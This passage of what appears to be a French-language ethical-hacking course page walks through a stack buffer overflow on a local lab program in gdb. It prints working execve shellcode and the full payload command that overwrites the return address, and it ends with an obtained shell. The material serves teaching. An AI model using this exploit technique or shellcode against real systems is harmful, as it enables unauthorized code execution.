<p>Donc on doit passer au programme une chaîne de 120 caractères (chaque caractère occupe 1 octet). On pourrait le faire manuellement mais on utilisera plutôt une commande python, comme suit:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>gdb) run $(python -c &#39;print(&#34;x&#34; * 120)&#39;)
Starting program: /home/kali/bo_2 $(python -c &#39;print(&#34;x&#34; * 120)&#39;)

Breakpoint 10, maFonction (valeur=0x7fffffffe685 &#39;x&#39; &lt;repeats 120 times&gt;) at bo_2.c:8
8	}
(gdb) x/144bx buffer
0x7fffffffe200:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe208:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe210:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe218:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe220:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe228:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe230:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe238:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe240:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe248:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe250:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe258:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe260:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe268:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe270:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe278:	0x00	0x51	0x55	0x55	0x55	0x55	0x00	0x00
0x7fffffffe280:	0xf8	0xe3	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe288:	0x00	0x00	0x00	0x00	0x02	0x00	0x00	0x00
(gdb) i f
Stack level 0, frame at 0x7fffffffe280:
 rip = 0x555555555164 in maFonction (bo_2.c:8); saved rip = 0x555555555100
 called by frame at 0x7fffffffe288
 source language c.
 Arglist at 0x7fffffffe270, args: valeur=0x7fffffffe685 &#39;x&#39; &lt;repeats 120 times&gt;
 Locals at 0x7fffffffe270, Previous frame&#39;s sp is 0x7fffffffe280
 Saved registers:
  rbp at 0x7fffffffe270, rip at 0x7fffffffe278</code></pre></div><p>Les adresses sont différentes mais la logique demeure la même: ici l’adresse de retour est 0x555555555100 et elle se trouve à 0x7fffffffe278, et on constate que notre séquence de &ldquo;x&rdquo; se termine tout juste avant – un &ldquo;x&rdquo; de plus et on commence à empiéter sur l’adresse de retour. Pour la remplacer en entier par des &ldquo;x&rdquo;, il faut que la séquence de &ldquo;x&rdquo; passée au programme ait la taille de 128:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) run $(python -c &#39;print(&#34;x&#34; * 128)&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/bo_2 $(python -c &#39;print(&#34;x&#34; * 128)&#39;)

Breakpoint 10, maFonction (valeur=0x7fffffffe67d &#39;x&#39; &lt;repeats 128 times&gt;) at bo_2.c:8
8	}
(gdb) x/144bx buffer
0x7fffffffe1f0:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe1f8:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe200:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe208:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe210:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe218:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe220:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe228:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe230:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe238:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe240:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe248:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe250:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe258:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe260:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe268:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe270:	0x00	0xe3	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe278:	0x00	0x00	0x00	0x00	0x02	0x00	0x00	0x00
(gdb) i f
Stack level 0, frame at 0x7fffffffe270:
 rip = 0x555555555164 in maFonction (bo_2.c:8); saved rip = 0x7878787878787878
 called by frame at 0x7fffffffe278
 source language c.
 Arglist at 0x7fffffffe260, args: valeur=0x7fffffffe67d &#39;x&#39; &lt;repeats 128 times&gt;
 Locals at 0x7fffffffe260, Previous frame&#39;s sp is 0x7fffffffe270
 Saved registers:
  rbp at 0x7fffffffe260, rip at 0x7fffffffe268</code></pre></div><p>Comme on le voit, l’adresse de retour (&ldquo;saved rip&rdquo;) a été entièrement remplacée par <code>0x78</code>.
Maintenant nous savons comment exploiter un &ldquo;buffer overflow&rdquo; pour remplacer la valeur de l’adresse de retour. Par quoi la remplacera-t-on?</p>
<p>Le seul endroit où il est possible pour nous d’insérer des données est dans la zone mémoire allouée à la variable &ldquo;buffer&rdquo;, et on dispose de 120 octets. Pour l’instant, nous n’y avons injecté que des &ldquo;x&rdquo; mais il serait plus utile d’y mettre les instructions d’un programme. Donc, si ce code est injecté à l’adresse de la variable &ldquo;buffer&rdquo;, l’adresse de retour devra être remplacée par l’adresse de la variable &ldquo;buffer&rdquo;:</p>
<p><a href="#R-image-86fab9083ef1c81e878ecc394a9508de" class="lightbox-link"><img alt="retaddr" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/420-513/images/ret-addr.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-86fab9083ef1c81e878ecc394a9508de"><img alt="retaddr" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/420-513/images/ret-addr.png"></a></p>
<p>L’adresse de la variable injectable est <code>0x7fffffffe200</code> (en réalité, <code>0x00007fffffffe200</code>: l’architecture du processeur est de 64 bits, ce qui signifie que les adresses mémoire ont 8 octets, mais les valeurs nulles ne sont pas notées). Comme nous l’avons vu ses octets sont inversés en mémoire, donc la valeur à insérer sera:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>00 e2 ff ff ff 7f 00 00</code></pre></div><p>On l’ajoutera donc à la suite des 120 &ldquo;x&rdquo; lorsqu’on lance le programme:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) run $(python -c &#39;print(&#34;x&#34; * 120 + &#34;\x00\xe2\xff\xff\xff\x7f\x00\x00&#34;)&#39;)</code></pre></div>
<div class="box notices cstyle warning">
  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Attention</div>
  <div class="box-content">

<p>Lorsque vous relancez le programme, il est possible que les adresses changent légèrement; or si la variable <code>buffer</code> change d’adresse, alors l’adresse de retour qu’on veut remplacer sera elle aussi décalée. Il est dans ce cas nécessaire de recommencer à quelques reprises en changeant chaque fois l’adresse de retour jusqu’à ce que celle-ci corresponde réellement à l’adresse de <code>buffer</code>.</p>
</div>
</div>
<p>Tout ce qu’il reste à faire maintenant est de remplacer la séquence de &ldquo;x&rdquo; par du code utile.</p>
<h3 id="injection-de-_shellcode_">Injection de <em>shellcode</em></h3>
<p>Le programme à insérer dans la pile doit comprendre des instructions directement compréhensibles par le processeur de l’hôte sur lequel s’exécute le programme – l’équivalent de ce que contient un fichier binaire exécutable, traduit en valeurs hexadécimales. On appelle ce type de programme un <em>shellcode</em>.</p>
<p>Il serait possible de le coder par nous-mêmes, mais on peut aussi utiliser des ressources déjà disponibles. Ici on utilisera un <em>shellcode</em> permettant d’ouvrir une invite de commande sur l’hôte (disponible ici: <a href="http://shell-storm.org/shellcode/files/shellcode-806.php" rel="external" target="_blank">http://shell-storm.org/shellcode/files/shellcode-806.php</a> :</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</code></pre></div><p>Ce code contient 27 octets (qui doivent être pris parmi les 120 disponibles); on doit envoyer la séquence suivante:</p>
<blockquote>
<p>shellcode + série de &ldquo;x&rdquo; + adresse de retour</p>
</blockquote>
<p>Notre série de &ldquo;x&rdquo; doit avoir une taille de 93 octets (120 – 27).</p>
<p>On lance donc le programme comme suit dans <em>gdb</em>:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) run $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)
Starting program: /home/kali/bo_2 $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)

Breakpoint 10, maFonction (
    valeur=0x7fffffffe67d &#34;1\300H\273ѝ\226\221Ќ\227\377H\367\333ST_\231RWT^\260;\017\005&#34;, &#39;x&#39; &lt;repeats 93 times&gt;, &#34;\340\341\377\377\377\177&#34;) at bo_2.c:8
8	}
(gdb) x/144bx buffer
0x7fffffffe1e0:	0x31	0xc0	0x48	0xbb	0xd1	0x9d	0x96	0x91
0x7fffffffe1e8:	0xd0	0x8c	0x97	0xff	0x48	0xf7	0xdb	0x53
0x7fffffffe1f0:	0x54	0x5f	0x99	0x52	0x57	0x54	0x5e	0xb0
0x7fffffffe1f8:	0x3b	0x0f	0x05	0x78	0x78	0x78	0x78	0x78
0x7fffffffe200:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe208:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe210:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe218:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe220:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe228:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe230:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe238:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe240:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe248:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe250:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe258:	0xe0	0xe1	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe260:	0xd8	0xe3	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe268:	0x00	0x00	0x00	0x00	0x04	0x00	0x00	0x00
(gdb) i f
Stack level 0, frame at 0x7fffffffe260:
 rip = 0x555555555164 in maFonction (bo_2.c:8); saved rip = 0x7fffffffe1e0
 called by frame at 0x7fffffffe268
 source language c.
 Arglist at 0x7fffffffe250, args: 
    valeur=0x7fffffffe67d &#34;1\300H\273ѝ\226\221Ќ\227\377H\367\333ST_\231RWT^\260;\017\005&#34;, &#39;x&#39; &lt;repeats 93 times&gt;, &#34;\340\341\377\377\377\177&#34;
 Locals at 0x7fffffffe250, Previous frame&#39;s sp is 0x7fffffffe260
 Saved registers:
  rbp at 0x7fffffffe250, rip at 0x7fffffffe258</code></pre></div><p>Si notre calcul est bon, on devrait voir les données du shellcode à l’adresse de la variable buffer et cette même adresse comme adresse de retour (&ldquo;saved rip&rdquo;).</p>
<p>Finalement, pour exécuter notre <em>shellcode</em>, on supprime tous les points d’arrêt avec la commande <code>clear</code> et on relance l’exécution:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) clear
Deleted breakpoint 1 
(gdb) run $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)
Starting program: /usr/bin/dash $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/bo_2 $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)
Starting program: /usr/bin/dash $(python -c &#39;print(&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34; + &#34;x&#34; * 93 + &#34;\xe0\xe1\xff\xff\xff\x7f\x00\x00&#34;)&#39;)
process 6807 is executing new program: /usr/bin/dash
$ whoami
[Detaching after vfork from child process 6814]
kali
$ ls  
[Detaching after vfork from child process 6815]
Desktop    Downloads  Pictures	Templates	bo_1  	bo_2
Documents  Music      Public		Videos	   	bo_1.c	bo_2.c
$</code></pre></div><p>Et on a une ligne de commande.</p>

            <footer class="footline">
            </footer>
          </article>
        </div>
      </main>
    </div>
    <aside id="R-sidebar" class="default-animation">
      <div id="R-header-topbar" class="default-animation"></div>
      <div id="R-header-wrapper" class="default-animation">
        <div id="R-header" class="default-animation">
<svg width="200" height="35" viewBox="0 0 219.57 44.202" xmlns="http://www.w3.org/2000/svg"><g id="svgGroup" stroke-linecap="round" fill-rule="evenodd" font-size="9pt" stroke="#ffffff" stroke-width="0.25mm" fill="#ffffff" style="stroke:#ffffff;stroke-width:0.25mm;fill:#ffffff"><path d="M 136.695 33.866 L 137.605 33.476 Q 138.45 38.611 142.09 40.951 Q 145.463 43.12 150.512 43.279 A 25.707 25.707 0 0 0 151.32 43.291 A 15.103 15.103 0 0 0 154.751 42.917 A 11.923 11.923 0 0 0 157.918 41.699 Q 160.745 40.106 162.37 37.279 A 12.253 12.253 0 0 0 163.917 32.365 A 15.207 15.207 0 0 0 163.995 30.811 A 14.455 14.455 0 0 0 163.58 27.282 A 11.856 11.856 0 0 0 162.435 24.376 Q 160.875 21.581 158.08 20.021 A 12.265 12.265 0 0 0 153.626 18.584 A 15.479 15.479 0 0 0 151.645 18.461 Q 148.135 18.461 145.698 19.274 A 15.993 15.993 0 0 0 143.726 20.072 Q 142.709 20.569 141.896 21.178 A 9.58 9.58 0 0 0 141.668 21.354 Q 140.075 22.621 139.035 23.986 L 138.125 23.986 L 140.075 0.651 L 163.41 0.651 L 163.41 1.561 L 140.92 1.561 L 139.23 21.646 L 139.1 22.881 L 139.165 22.881 A 10.565 10.565 0 0 1 140.888 21.031 Q 142.046 20.039 143.618 19.176 Q 146.575 17.551 151.645 17.551 Q 155.61 17.551 158.6 19.241 Q 161.59 20.931 163.313 23.921 Q 165.035 26.911 165.035 30.811 A 14.875 14.875 0 0 1 164.601 34.454 A 13.099 13.099 0 0 1 164.027 36.206 Q 163.02 38.676 161.2 40.464 Q 159.38 42.251 156.878 43.226 A 14.289 14.289 0 0 1 153.175 44.106 A 17.646 17.646 0 0 1 151.32 44.201 A 22.296 22.296 0 0 1 146.778 43.759 A 16.677 16.677 0 0 1 141.797 41.894 Q 137.888 39.637 136.745 34.116 A 19.16 19.16 0 0 1 136.695 33.866 Z M 191.23 34.386 L 192.14 33.801 Q 192.725 36.661 194.545 38.806 A 11.743 11.743 0 0 0 198.417 41.773 A 14.029 14.029 0 0 0 199.192 42.121 A 14.984 14.984 0 0 0 202.651 43.067 A 20.18 20.18 0 0 0 205.725 43.291 Q 209.43 43.291 212.323 41.991 Q 215.215 40.691 216.873 38.156 A 9.97 9.97 0 0 0 218.311 34.48 A 13.661 13.661 0 0 0 218.53 31.981 A 11.636 11.636 0 0 0 218.293 29.567 Q 217.947 27.936 217.098 26.677 A 7.361 7.361 0 0 0 217.035 26.586 Q 215.54 24.441 213.038 23.401 A 13.623 13.623 0 0 0 209.155 22.443 A 16.682 16.682 0 0 0 207.48 22.361 L 205.108 22.361 A 22.974 22.974 0 0 0 204.663 22.365 Q 204.182 22.374 203.841 22.405 A 5.736 5.736 0 0 0 203.645 22.426 L 203.645 21.451 Q 204.36 21.516 205.367 21.516 L 207.285 21.516 A 12.644 12.644 0 0 0 210.486 21.132 A 9.095 9.095 0 0 0 214.663 18.786 A 9.07 9.07 0 0 0 217.175 14.015 A 13.257 13.257 0 0 0 217.425 11.376 A 12.561 12.561 0 0 0 217.03 8.141 A 9.02 9.02 0 0 0 214.37 3.706 Q 211.315 0.911 206.115 0.911 A 16.814 16.814 0 0 0 202.024 1.388 A 13.161 13.161 0 0 0 197.958 3.154 Q 194.545 5.396 193.375 9.296 L 192.4 8.776 Q 193.375 6.046 195.325 4.064 A 12.804 12.804 0 0 1 199.78 1.141 A 14.767 14.767 0 0 1 200.038 1.041 A 16.287 16.287 0 0 1 204.294 0.083 A 19.75 19.75 0 0 1 206.115 0.001 A 17.588 17.588 0 0 1 209.221 0.262 A 12.791 12.791 0 0 1 212.648 1.366 Q 215.41 2.731 216.938 5.266 A 10.42 10.42 0 0 1 218.241 8.791 A 14.271 14.271 0 0 1 218.465 11.376 Q 218.465 13.326 217.913 15.081 Q 217.36 16.836 216.32 18.266 Q 215.28 19.696 213.72 20.639 A 9.434 9.434 0 0 1 211.183 21.69 A 11.438 11.438 0 0 1 210.145 21.906 L 210.145 21.971 Q 212.225 22.101 213.948 22.881 Q 215.67 23.661 216.938 24.961 A 8.622 8.622 0 0 1 218.66 27.548 A 10.16 10.16 0 0 1 218.887 28.114 Q 219.57 29.966 219.57 32.241 A 12.097 12.097 0 0 1 219.066 35.792 A 10.402 10.402 0 0 1 217.782 38.514 A 11.918 11.918 0 0 1 213.111 42.605 A 14.14 14.14 0 0 1 212.907 42.706 A 14.867 14.867 0 0 1 208.363 44.04 A 18.955 18.955 0 0 1 205.855 44.201 A 20.558 20.558 0 0 1 201.466 43.756 A 14.723 14.723 0 0 1 196.17 41.504 Q 192.27 38.806 191.23 34.386 Z M 65.26 43.551 L 36.79 43.551 L 36.79 42.641 A 924.16 924.16 0 0 0 42.299 38.026 A 687.773 687.773 0 0 0 47.255 33.801 A 143.576 143.576 0 0 0 51.364 30.13 Q 53.535 28.111 55.348 26.229 Q 58.39 23.07 60.167 20.093 A 23.183 23.183 0 0 0 60.58 19.371 A 15.014 15.014 0 0 0 62.039 15.673 A 12.709 12.709 0 0 0 62.4 12.676 A 14.967 14.967 0 0 0 61.994 9.089 A 10.169 10.169 0 0 0 59.118 4.031 A 10.954 10.954 0 0 0 54.013 1.332 Q 52.311 0.924 50.309 0.911 A 20.352 20.352 0 0 0 50.18 0.911 Q 44.46 0.911 41.015 4.421 A 12.596 12.596 0 0 0 37.745 10.514 A 17.809 17.809 0 0 0 37.31 13.781 L 36.335 13.391 A 18.027 18.027 0 0 1 36.853 9.795 A 13.746 13.746 0 0 1 38.253 6.306 Q 39.975 3.316 43.03 1.659 A 13.527 13.527 0 0 1 47.429 0.206 A 17.81 17.81 0 0 1 50.18 0.001 A 18.992 18.992 0 0 1 53.166 0.226 A 14.69 14.69 0 0 1 55.672 0.846 A 11.597 11.597 0 0 1 58.747 2.436 A 10.559 10.559 0 0 1 59.832 3.349 Q 61.555 5.006 62.465 7.346 A 13.146 13.146 0 0 1 63.225 10.354 A 17.279 17.279 0 0 1 63.375 12.676 A 15.137 15.137 0 0 1 61.627 19.662 A 19.527 19.527 0 0 1 60.385 21.744 Q 58.061 25.154 54.185 28.918 A 78.507 78.507 0 0 1 51.838 31.104 Q 48.017 34.522 43.167 38.663 A 777.674 777.674 0 0 1 38.545 42.576 L 38.545 42.641 L 39.163 42.641 L 39.78 42.641 L 40.365 42.641 L 65.26 42.641 L 65.26 43.551 Z M 22.75 43.551 L 21.71 43.551 L 21.71 30.226 L 0 30.226 L 0 29.316 L 21.32 0.651 L 22.75 0.651 L 22.75 29.316 L 31.785 29.316 L 31.785 30.226 L 22.75 30.226 L 22.75 43.551 Z M 82.132 43.397 A 15.037 15.037 0 0 0 87.165 44.201 A 17.016 17.016 0 0 0 89.378 44.061 A 12.633 12.633 0 0 0 98.475 38.481 A 18.869 18.869 0 0 0 100.762 33.881 Q 101.635 31.36 102.054 28.272 A 46.023 46.023 0 0 0 102.44 22.101 A 47.711 47.711 0 0 0 102.169 16.869 Q 101.823 13.735 101.033 11.154 A 19.467 19.467 0 0 0 98.475 5.721 A 12.667 12.667 0 0 0 92.198 0.805 A 15.037 15.037 0 0 0 87.165 0.001 A 17.016 17.016 0 0 0 84.952 0.141 A 12.633 12.633 0 0 0 75.855 5.721 A 18.869 18.869 0 0 0 73.568 10.321 Q 72.695 12.842 72.276 15.93 A 46.023 46.023 0 0 0 71.89 22.101 A 47.711 47.711 0 0 0 72.161 27.333 Q 72.507 30.467 73.297 33.048 A 19.467 19.467 0 0 0 75.855 38.481 A 12.667 12.667 0 0 0 82.132 43.397 Z M 182.78 43.551 L 181.74 43.551 L 181.74 6.631 L 181.74 4.616 L 181.74 2.601 Q 179.79 5.786 176.703 7.899 A 25.411 25.411 0 0 1 172.28 10.339 A 22.319 22.319 0 0 1 170.365 11.051 L 170.04 10.206 Q 171.795 9.556 173.518 8.646 Q 175.24 7.736 176.8 6.534 Q 178.36 5.331 179.628 3.869 Q 180.895 2.406 181.74 0.651 L 182.78 0.651 L 182.78 43.551 Z M 87.165 43.291 A 14.464 14.464 0 0 0 90.923 42.825 A 11.246 11.246 0 0 0 94.932 40.854 Q 98.085 38.416 99.743 33.671 A 27.228 27.228 0 0 0 100.876 29.121 Q 101.253 26.835 101.359 24.208 A 52.266 52.266 0 0 0 101.4 22.101 A 47.842 47.842 0 0 0 101.167 17.24 Q 100.924 14.867 100.428 12.827 A 24.33 24.33 0 0 0 99.743 10.499 Q 98.182 6.063 95.298 3.643 A 11.763 11.763 0 0 0 94.932 3.349 Q 91.78 0.911 87.165 0.911 Q 82.615 0.911 79.43 3.349 A 13.003 13.003 0 0 0 76.258 6.927 Q 75.287 8.51 74.588 10.499 A 26.604 26.604 0 0 0 73.484 14.862 Q 72.93 18.118 72.93 22.101 Q 72.93 27.626 74.016 31.788 A 24.373 24.373 0 0 0 74.588 33.671 A 18.938 18.938 0 0 0 76.151 37.086 Q 77.386 39.171 79.076 40.571 A 11.707 11.707 0 0 0 79.43 40.854 A 11.779 11.779 0 0 0 85.223 43.172 A 15.453 15.453 0 0 0 87.165 43.291 Z M 1.17 29.316 L 21.71 29.316 L 21.71 5.721 L 21.71 3.739 L 21.71 1.756 L 21.645 1.756 Q 20.995 2.731 20.248 3.706 A 71.964 71.964 0 0 0 19.181 5.132 A 62.417 62.417 0 0 0 18.85 5.591 L 1.17 29.316 Z M 110.76 25.481 L 129.025 25.481 L 129.025 26.521 L 110.76 26.521 L 110.76 25.481 Z" vector-effect="non-scaling-stroke"/></g></svg>
        </div>

        <search>
          <div class="searchbox default-animation">
            <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
            <label class="a11y-only" for="R-search-by">Search</label>
            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
          </div>
        </search>
        <script>
          var contentLangs=['fr'];
        </script>
        <script src="/420-513/js/auto-complete.js?1731358439" defer></script>
        <script src="/420-513/js/lunr/lunr.min.js?1731358439" defer></script>
        <script src="/420-513/js/lunr/lunr.stemmer.support.min.js?1731358439" defer></script>
        <script src="/420-513/js/lunr/lunr.multi.min.js?1731358439" defer></script>
        <script src="/420-513/js/lunr/lunr.fr.min.js?1731358439" defer></script>
        <script src="/420-513/js/search.js?1731358439" defer></script>
      </div>
      <div id="R-homelinks" class="default-animation">
        <hr class="padding">
      </div>
      <div id="R-content-wrapper" class="highlightable">
        <div id="R-topics">
          <ul class="enlarge morespace collapsible-menu">
          <li data-nav-id="/420-513/intro/index.html" class=""><a class="padding" href="/420-513/intro/index.html">1. Préalables</a><ul id="R-subsections-d5efd0a842116e4053b2a67d87eea20a" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/intro/ip/index.html" class=""><a class="padding" href="/420-513/intro/ip/index.html">Adressage IP</a></li>
          <li data-nav-id="/420-513/intro/kali/index.html" class=""><a class="padding" href="/420-513/intro/kali/index.html">Kali linux</a></li>
          <li data-nav-id="/420-513/intro/wiredump/index.html" class=""><a class="padding" href="/420-513/intro/wiredump/index.html">Wireshark et tcpdump</a></li>
          <li data-nav-id="/420-513/intro/ssh/index.html" class=""><a class="padding" href="/420-513/intro/ssh/index.html">SSH et SCP</a></li>
          <li data-nav-id="/420-513/intro/netcat/index.html" class=""><a class="padding" href="/420-513/intro/netcat/index.html">Netcat</a></li>
          <li data-nav-id="/420-513/intro/cybphases/index.html" class=""><a class="padding" href="/420-513/intro/cybphases/index.html">Phases d&#39;une cyberattaque</a></li></ul></li>
          <li data-nav-id="/420-513/collecte/index.html" class=""><a class="padding" href="/420-513/collecte/index.html">2. Collecte d&#39;informations</a><ul id="R-subsections-836ed22eacc6d10c19942ea0ec7fd7d3" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/collecte/passive/index.html" class=""><a class="padding" href="/420-513/collecte/passive/index.html">Passive</a></li>
          <li data-nav-id="/420-513/collecte/active/index.html" class=""><a class="padding" href="/420-513/collecte/active/index.html">Active</a></li></ul></li>
          <li data-nav-id="/420-513/enumweb/index.html" class=""><a class="padding" href="/420-513/enumweb/index.html">3. Énumération web</a><ul id="R-subsections-35c9976c15304c363c8ea14f2c275c11" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/enumweb/analyse/index.html" class=""><a class="padding" href="/420-513/enumweb/analyse/index.html">Analyse</a></li>
          <li data-nav-id="/420-513/enumweb/fuzzing/index.html" class=""><a class="padding" href="/420-513/enumweb/fuzzing/index.html">Fuzzing</a></li></ul></li>
          <li data-nav-id="/420-513/vuln/index.html" class=""><a class="padding" href="/420-513/vuln/index.html">4. Recherche de vulnérabilités</a><ul id="R-subsections-ba6d3ba55249f05bb81e0514fe91baf6" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/vuln/types/index.html" class=""><a class="padding" href="/420-513/vuln/types/index.html">Types</a></li>
          <li data-nav-id="/420-513/vuln/ressources/index.html" class=""><a class="padding" href="/420-513/vuln/ressources/index.html">Ressources</a></li>
          <li data-nav-id="/420-513/vuln/nessus/index.html" class=""><a class="padding" href="/420-513/vuln/nessus/index.html">Nessus</a></li>
          <li data-nav-id="/420-513/vuln/outils/index.html" class=""><a class="padding" href="/420-513/vuln/outils/index.html">Autres outils</a></li></ul></li>
          <li data-nav-id="/420-513/vulnweb/index.html" class=""><a class="padding" href="/420-513/vulnweb/index.html">5. Vulnérabilités Web</a><ul id="R-subsections-5759ab18f34a2b619dfbdce8aa7b2a85" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/vulnweb/sqlinj/index.html" class=""><a class="padding" href="/420-513/vulnweb/sqlinj/index.html">Injection SQL</a></li>
          <li data-nav-id="/420-513/vulnweb/xss/index.html" class=""><a class="padding" href="/420-513/vulnweb/xss/index.html">XSS</a></li>
          <li data-nav-id="/420-513/vulnweb/csrf/index.html" class=""><a class="padding" href="/420-513/vulnweb/csrf/index.html">CSRF</a></li></ul></li>
          <li data-nav-id="/420-513/exploitation/index.html" class="parent "><a class="padding" href="/420-513/exploitation/index.html">6. Exploitation</a><ul id="R-subsections-894c9faf54abc7e150203e7252bdf314" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/exploitation/revshell/index.html" class=""><a class="padding" href="/420-513/exploitation/revshell/index.html">Shells inversés</a></li>
          <li data-nav-id="/420-513/exploitation/bof/index.html" class="active"><a class="padding" href="/420-513/exploitation/bof/index.html">Buffer Overflows</a></li></ul></li>
          <li data-nav-id="/420-513/automatisation/index.html" class=""><a class="padding" href="/420-513/automatisation/index.html">7. Automatisation</a><ul id="R-subsections-0df5a769aeb7922f47e86b93de3a310c" class="morespace collapsible-menu">
          <li data-nav-id="/420-513/automatisation/metasploit/index.html" class=""><a class="padding" href="/420-513/automatisation/metasploit/index.html">Metasploit</a></li></ul></li>
          </ul>
        </div>
